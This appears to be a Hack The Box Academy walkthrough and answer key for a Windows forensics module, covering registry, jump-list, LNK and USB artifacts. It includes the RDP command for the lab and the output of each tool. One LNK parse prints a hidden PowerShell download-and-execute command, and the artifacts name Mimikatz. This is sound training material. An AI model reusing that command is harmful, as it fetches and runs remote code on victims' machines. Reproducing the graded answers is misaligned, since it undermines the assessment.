| Section                                | Question Number | Answer                                                                             |
| -------------------------------------- | --------------- | ---------------------------------------------------------------------------------- |
| Shellbags                              | Question 1      | Finance                                                                            |
| Shellbags                              | Question 2      | Programs                                                                           |
| User Assist                            | Question 1      | 1                                                                                  |
| User Assist                            | Question 2      | ProgramFilesX64                                                                    |
| User Assist                            | Question 3      | Registry Editor.lnk                                                                |
| Search History in File Explorer        | Question 1      | password\*.xlsx                                                                    |
| JumpLists                              | Question 1      | \\vmware-host\\Shared Folders\\network\_server\_sensitive\\HR\\salary\_details.csv |
| LNK Files                              | Question 1      | 120.48.85.228                                                                      |
| Run MRU Forensics                      | Question 1      | ncpa.cpl                                                                           |
| Recent Docs                            | Question 1      | Invoke-Mimikatz.ps1                                                                |
| Open/Save Dialog MRUs                  | Question 1      | discord.exe                                                                        |
| Open/Save Dialog MRUs                  | Question 2      | PickerHost.exe                                                                     |
| TypedPaths                             | Question 1      | C:\\Users\\John Doe\\Desktop\\Tools\\hidden\\docs\\passwords.rtf                   |
| MS Office Accessed Files (File MRU)    | Question 1      | C:\\Users\\John Doe\\Desktop\\Copied\_from\_server\\new\_project.ppt               |
| Adobe Recent Files                     | Question 1      | forbidden.pdf                                                                      |
| User's Sticky Notes Forensics          | Question 1      | thisisasecretpassword                                                              |
| Archive history                        | Question 1      | important\_numbers.txt:passwords.txt                                               |
| Command-line history forensics         | Question 1      | https://textdoc.co//home/downIoad/2YH61Er9JM7PysGV                                 |
| Command-line history forensics         | Question 2      | PsExec.exe                                                                         |
| Saved SSH Keys And Server Info (Putty) | Question 1      | Software\\SimonTatham\\PuTTY\\SshHostKeys                                          |
| Terminal Server History (tsclient)     | Question 1      | 192.168.182.239                                                                    |
| Terminal Server History (tsclient)     | Question 2      | HTBVM01\\administrator                                                             |
| ActivityCache.db                       | Question 1      | malware.exe                                                                        |
| USB Devices                            | Question 1      | Kingston DataTraveler 2.0 USB Device                                               |
| USB Devices                            | Question 2      | gary-pc2                                                                           |
| Skills Assessment                      | Question 1      | \\Server1\\McBeer                                                                  |
| Skills Assessment                      | Question 2      | E:\\Board Presentation.pdf                                                         |
| Skills Assessment                      | Question 3      | Removable storage media (Floppy, USB)                                              |
| Skills Assessment                      | Question 4      | 17:52:27                                                                           |
| Skills Assessment                      | Question 5      | Strategy                                                                           |
| Skills Assessment                      | Question 6      | https://www.quora.com/How-can-I-secretly-take-files-off-a-computer-using-a-USB     |
| Skills Assessment                      | Question 7      | 17:52:59                                                                           |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Shellbags

## Question 1

### "Examine the shellbags located at "C:\\Tools\\DFIR-Data\\evidence\\001.shellbags\_data\\D\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat" using RegRipper. Identify the Resource under "My Network Places" that starts with "F" and ends with "e". The answer format is F\*\*\*\*\*e."

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-ywvvvpfx69]─[~]
└──╼ [★]$ xfreerdp /v:10.129.130.105 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.130.105:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `UsrClass.dat` registry hive with the `shellbags` plugin, filtering the output to provide results related to the `My Network Places` to find the answer (resource):

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper\
.\rip.exe -r 'C:\Tools\DFIR-Data\evidence\001.shellbags_data\D\Users\John Doe\AppData\Local\Microsoft\Windows\UsrClass.dat' -p shellbags | Select-String "My Network Places"
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper\
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r 'C:\Tools\DFIR-Data\evidence\001.shellbags_data\D\Users\John Doe\AppData\Local\Microsoft\Windows\UsrClass.dat' -p shellbags | Select-String "My Network Places"

Launching shellbags v.20200428

<SNIP>

                     |2023-11-11 14:42:36  | 2023-11-11 14:43:26  | 2023-11-11 14:42:36  |                      | 90692/9      |My Network Places\10.10.10.11\\\10.10.10.11\htbfs01\Business [Desktop\5\1\1\1\]
                     |2023-11-11 14:42:28  | 2023-11-11 14:43:26  | 2023-11-11 14:42:28  |                      | 90665/5      |My Network Places\10.10.10.11\\\10.10.10.11\htbfs01\{hidden} [Desktop\5\1\1\2\]
                     |2023-11-11 14:42:24  | 2023-11-11 14:43:26  | 2023-11-11 14:42:24  |                      | 90663/6      |My Network Places\10.10.10.11\\\10.10.10.11\htbfs01\HR [Desktop\5\1\1\3\]
                     |2023-11-11 14:42:20  | 2023-11-11 14:43:26  | 2023-11-11 
<SNIP>
```

Answer: `Finance`

# Shellbags

## Question 2

### "Use ShellBags Explorer to load "C:\\Tools\\DFIR-Data\\evidence\\001.shellbags\_data\\D\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat". In ControlPanelHome, which item doesn't have a check in the "Has Explored" checkbox? The answer format is P\*\*\*\*\*\*\*"

Students will reuse the previously established RDP session and are going to utilize `ShellBagsExplorer.exe` located in `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\ShellBagsExplorer\`:

Code: powershell

```powershell
C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\ShellBagsExplorer\ShellBagsExplorer.exe
```

```
PS C:\Tools\DFIR-Data\Tools\RegRipper> C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\ShellBagsExplorer\ShellBagsExplorer.exe
```

Students will be prompted for information related to email address contact and options, where they will press the `X` button. Subsequently, students will be presented with the `ShellBags Explorer` view, and they will click on `File` and `Load offline hive`.

![[HTB Solutions/Others/z. images/d1a7d0784eb42ba1d82a364f3d14f681_MD5.jpg]]

Next, students will select the `UsrClass.dat` file and open it.

![[HTB Solutions/Others/z. images/c037d7b03d8afe631d1ddd56801d6b40_MD5.jpg]]

After the parsing of the data, students will navigate to the `ControlPanelHome` value and find the third entry is missing the `Has Explored` value:

![[HTB Solutions/Others/z. images/dcc4dc7c5033a1b432d7dbdc8eb684da_MD5.jpg]]

Answer: `Programs`

# User Assist

## Question 1

### "Examine the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\002.userassist\\NTUSER.DAT" using RegRipper. Identify the Run Count for "C:\\Users\\Public\\Desktop\\TeamViewer.lnk"."

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-m3hqg9a846]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.125 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.229.125:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `userassist_tln` plugin, finding the number of run count of `C:\Users\Public\Desktop\TeamViewer.lnk`:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper\
.\rip.exe -r 'C:\Tools\DFIR-Data\evidence\002.userassist\NTUSER.DAT' -p userassist_tln
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper\
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r 'C:\Tools\DFIR-Data\evidence\002.userassist\NTUSER.DAT' -p userassist_tln

Launching userassist_tln v.20180710
<SNIP>

1699714441|REG|||[Program Execution] UserAssist - C:\Users\Public\Desktop\KeePass 2.lnk (1)
1699714426|REG|||[Program Execution] UserAssist - C:\Users\Public\Desktop\TeamViewer.lnk ({hidden})
1699356487|REG|||[Program Execution] UserAssist - {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Administrative Tools\Registry Editor.lnk (3)

<SNIP>
```

Answer: `1`

# User Assist

## Question 2

### "One of the values in UserAssist is "{6Q809377-6NS0-444O-8957-N3773S02200R}\\Jvaqbjf AG\\Npprffbevrf\\jbeqcnq.rkr". Decrypt this value and refer to the Microsoft documentation mentioned in this section to identify the Windows Known Folder name related to the GUID. Use the folder name from the Microsoft documentation as the answer. The answer is in the format P******F******\*"

Students will use their workstations, open `Firefox`, navigate to `https://gchq.github.io/CyberChef/`, and choose `ROT13` for the recipe. Alternatively, students can use the following [recipe](https://gchq.github.io/CyberChef/#recipe=ROT13\(true,true,false,13\)&input=ezZRODA5Mzc3LTZOUzAtNDQ0Ty04OTU3LU4zNzczUzAyMjAwUn1cSnZhcWJqZiBBR1xOcHByZmZiZXZyZlxqYmVxY25xLnJrcg):

![[HTB Solutions/Others/z. images/569efa8e2753af476213ec54d53d59f5_MD5.jpg]]

Next, students will copy the decoded GUID value `6D809377-6AF0-444B-8957-A3773F02200E`. They will utilize Microsoft's documentation regarding [Known Folder GUIDs for File Dialog Custom Places](https://learn.microsoft.com/en-us/dotnet/desktop/winforms/controls/known-folder-guids-for-file-dialog-custom-places?view=netframeworkdesktop-4.8) and find in the list of GUIDs the associated folder based on the decoded value:

![[HTB Solutions/Others/z. images/01922bb8b8522ff90e5665c30b1c192c_MD5.jpg]]

Answer: `ProgramFilesX64`

# User Assist

## Question 3

### "Use Registry Explorer to open the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\002.userassist\\NTUSER.DAT". Click on "Available Bookmarks" and scroll down to locate the UserAssist bookmark. Under this bookmark, click on the key named {F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}. In the count section, you should see some .lnk file names. Identify the name of the .lnk file with a Run count of 3, and enter it as your answer. The answer is in the format R\*\*\*\*\*\*\* E\*\*\*\*\*.lnk"

Students will return to the previously established RDP session and will use `RegistryExplorer.exe` located in the `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\RegistryExplorer` directory:

Code: powershell

```powershell
C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\RegistryExplorer\RegistryExplorer.exe
```

```
PS C:\Tools\DFIR-Data\Tools\RegRipper> C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\RegistryExplorer\RegistryExplorer.exe
```

Next, students will click on `File` and `Load hive`:

![[HTB Solutions/Others/z. images/2f2e58203fc8b4bcbc02dda5f9b819d8_MD5.webp]]

Subsequently, students will navigate to the `C:\Tools\DFIR-Data\evidence\002.userassist\` directory and select the `NTUSER.DAT` registry hive:

![[HTB Solutions/Others/z. images/2fa288e4736ba45ad8307cc158c32887_MD5.webp]]

Students will click on the `Available bookmarks (30/0)`, select the `UserAssist` key, and display programs with `Run Counter` equal to 3 to identify the `lnk` file with that run counter value:

![[HTB Solutions/Others/z. images/a9af561ed9bf3f130f95dc4ed8397e4f_MD5.webp]]

Answer: `Registry Editor.lnk`

# Search History in File explorer

## Question 1

### "Using RegRipper, examine the user's search queries in the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\003.searchhistory\\NTUSER.DAT". The user attempted to search for .xlsx files containing credentials information. Use the search query as the answer. The answer format is \*\*\*\*\*\*\*\*\*.xlsx"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-m3hqg9a846]─[~]
└──╼ [★]$ xfreerdp /v:10.129.132.29 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.132.29:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `wordwheelquery` plugin, finding the XLSX file related to credentials:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r 'C:\Tools\DFIR-Data\evidence\003.searchhistory\NTUSER.DAT' -p wordwheelquery
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r 'C:\Tools\DFIR-Data\evidence\003.searchhistory\NTUSER.DAT' -p wordwheelquery

Launching wordwheelquery v.20200823
wordwheelquery v.20200823
(NTUSER.DAT) Gets contents of user's WordWheelQuery key

Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery
LastWrite Time 2023-11-12 19:13:35Z

Searches listed in MRUListEx order

10   interesting_search
9    key.ppk
8    *azure*
7    *aws*
6    *.KDBX
5    *secret*.doc
4    *salary*.pdf
3    *password*.txt
2    password*.txt
1    {hidden}
0    salary*.xlsx
```

Answer: `password*.xlsx`

# JumpLists

## Question 1

### "Using JLECMD.exe, process the file "5f7b5f1e01b83767.automaticDestinations-ms" located in the AutomaticDestinations folder inside "004.jumplists\\KAPE\_Output". Identify the path mentioned in Entry #: 7. The answer format is \\\\path\\to\\file.csv"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-zkdfybq3ih]─[~]
└──╼ [★]$ xfreerdp /v:10.129.252.15 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.252.15:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6`, use `JLECmd.exe` to parse the `5f7b5f1e01b83767.automaticDestinations-ms` located in the `C:\Tools\DFIR-Data\evidence\004.jumplists\KAPE_Output\D\Users\John Doe\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\` directory, scrutinizing the 7th entry and the `Path` value:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
.\JLECmd.exe -f "C:\Tools\DFIR-Data\evidence\004.jumplists\KAPE_Output\D\Users\John Doe\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms"
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> .\JLECmd.exe -f "C:\Tools\DFIR-Data\evidence\004.jumplists\KAPE_Output\D\Users\John Doe\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms"
JLECmd version 1.5.0.0

<SNIP>

--- DestList entries ---
Entry #: 8
  MRU: 0
  Path: ftp://speedtest.tele2.net/upload/upload_file.txt
  Pinned: False
  Created on:    1582-10-15 00:00:00
  Last modified: 2023-11-12 12:01:24
  Hostname:
  Mac Address:
  Interaction count: 1

--- Lnk information ---
  Absolute path: Internet Explorer (Homepage)\speedtest.tele2.net\upload\       ?????u????????tupload_file.txt

Entry #: 7
  MRU: 1
  Path: {hidden}
  Pinned: False
  Created on:    1582-10-15 00:00:00
  Last modified: 2023-11-04 10:46:33
  Hostname:
  Mac Address:
  Interaction count: 2

--- Lnk information ---
   (lnk file not present)

<SNIP>
```

Answer: `\\vmware-host\Shared Folders\network_server_sensitive\HR\salary_details.csv`

# LNK Files

## Question 1

### "Using LECMD.exe, process the file "setup.lnk" located in the "005.lnk" folder. Identify the IP address mentioned in the arguments' value and use it as the answer. The answer format is ***.**.**.*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-lb7utjoi7g]─[~]
└──╼ [★]$ xfreerdp /v:10.129.214.186 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.214.186:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6`, use `LECmd.exe` to parse the `setup.lnk` file located in the `C:\Tools\DFIR-Data\evidence\005.lnk\` directory. In the output, students will find `IEX` cmdlet using the `downloadString` method of `WebClient`:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
.\LECmd.exe -f C:\Tools\DFIR-Data\evidence\005.lnk\setup.lnk
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> .\LECmd.exe -f C:\Tools\DFIR-Data\evidence\005.lnk\setup.lnk

LECmd version 1.5.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/LECmd

<SNIP>

Working Directory: E:\downloads
Arguments: -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://{hidden}:80/favicon'))"

--- Link information ---
Flags: VolumeIdAndLocalBasePath

>> Volume information
  Drive type: Fixed storage media (Hard drive)
  Serial number: BA2E9690
  Label: (No label)
  Local path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

--- Target ID information (Format: Type ==> Value) ---

  Absolute path: My Computer\C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

<SNIP>
```

Answer: `120.48.85.228`

# Run MRU Forensics

## Question 1

### "Using Registry Explorer or RegRipper, load the file located at "C:\\Tools\\DFIR-Data\\evidence\\006.run\_mru\\NTUSER.DAT". Identify the RUN command at the MRU value "d". Use the command/executable name as the answer. The answer format is n\*\*\*.\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-8vlsi9kj3g]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.125 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.229.125:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `runmru` plugin, finding the command next to the `d` entry:

Code: powershell

```powershell
cd  C:\Tools\DFIR-Data\Tools\RegRipper\
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd  C:\Tools\DFIR-Data\Tools\RegRipper\
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\006.run_mru\NTUSER.DAT" -p runmru

Launching runmru v.20200525
runmru v.20200525
(NTUSER.DAT) Gets contents of user's RunMRU key

RunMru
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
LastWrite Time 2023-11-22 10:29:58Z
MRUList = gmbnlkjihfdeac
a   sysdm.cpl\1
b   cmd\1
c   ping google.com\1
d   {hidden}\1
e   secpol.msc\1
f   appwiz.cpl\1
g   powershell\1
h   notepad\1
i   services.msc\1
j   \\10.10.10.11\Tools\1
k   \\10.10.10.11\htbfs01\1
l   explorer\1
m   regedit\1
n   C:\Temp\passwords\users.txt\1
```

Answer: `ncpa.cpl`

# Recent docs

## Question 1

### "Load the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\007.recentdocs\\NTUSER.DAT" in RegRipper and identify the name of a credentials-dumper PowerShell script. Use the name of the script as the answer. The answer format is I\*\*\*\*\*-\*\*\*\*\*\*\*\*.ps1"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-8vlsi9kj3g]─[~]
└──╼ [★]$ xfreerdp /v:10.129.4.227 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.4.227:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `recentdocts` plugin, finding the answer in the 42th value in the output:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\007.recentdocs\NTUSER.DAT" -p recentdocs
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\007.recentdocs\NTUSER.DAT" -p recentdocs

Launching recentdocs v.20200427
recentdocs v.20200427
(NTUSER.DAT) Gets contents of user's RecentDocs key

RecentDocs
**All values printed in MRUList\MRUListEx order.
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
LastWrite Time: 2023-11-22 10:29:47Z
  43 = Tools
  42 = {hidden}
  12 = HR
  8 = salary_details.csv
  24 = System32
  23 = passwords
  39 = users.txt

<SNIP>
```

Answer: `Invoke-Mimikatz.ps1`

# Open/Save Dialog MRUs

## Question 1

### "Load the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\008.open\_save\\NTUSER.DAT" in RegRipper. Then, use the comdlg32 plugin to find the name of the executable file under OpenSavePidl MRU, and use it as the answer. The answer format is **s**\*\*.exe"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-8vlsi9kj3g]─[~]
└──╼ [★]$ xfreerdp /v:10.129.110.100 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.110.100:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y 
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `comdlg32` plugin, finding the name of the executable:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\008.open_save\NTUSER.DAT" -p comdlg32
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\008.open_save\NTUSER.DAT" -p comdlg32

Launching comdlg32 v.20200517
comdlg32 v.20200517

<SNIP>

OpenSavePidlMRU\exe
LastWrite Time: Sun Sep 10 13:43:27 2023
Note: All value names are listed in MRUListEx order.

  My Computer\C:\Temp\{hidden}\{hidden}

OpenSavePidlMRU\ps1
LastWrite Time: Wed Nov 22 10:29:47 2023
Note: All value names are listed in MRUListEx order.

  My Computer\C:\Tools\Invoke-Mimikatz.ps1
```

Answer: `discord.exe`

# Open/Save Dialog MRUs

## Question 2

### "Load the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\008.open\_save\\NTUSER.DAT" in RegRipper. Then, use the comdlg32 plugin to examine the LastVisitedPidl MRU. Identify the name of the executable file that opened or saved files in "C:\\Temp". The answer format is P\*\*\*\*\*\*\*\*\*.exe"

Students will reuse the previously established RDP session and will scrutinize the output of `RegRipper` executed in the previous question to find the executable under the `LastVisitedPdlMRU` output:

```
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\008.open_save\NTUSER.DAT" -p comdlg32
Launching comdlg32 v.20200517
comdlg32 v.20200517

Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32
LastWrite Time 2023-09-10 13:16:22Z
CIDSizeMRU
LastWrite: 2023-11-22 10:29:47Z
Note: All value names are listed in MRUListEx order.

<SNIP>

LastVisitedPidlMRU
LastWrite time: 2023-11-22 10:29:47Z
Note: All value names are listed in MRUListEx order.

  NOTEPAD.EXE - My Computer\C:\Tools
  apimonitor-x64.exe - My Computer\C:\Temp\discord
  {hidden} - My Computer\C:\Temp
```

Answer: `PickerHost.exe`

# TypedPaths

## Question 1

### "Load the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\009.typedpaths\\exercise\\NTUSER.DAT" in RegRipper. Then, use the typedpaths plugin to identify the value of url6, and use it as the answer. The answer ends with .rtf"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-8vlsi9kj3g]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.125 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.229.125:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y 
```

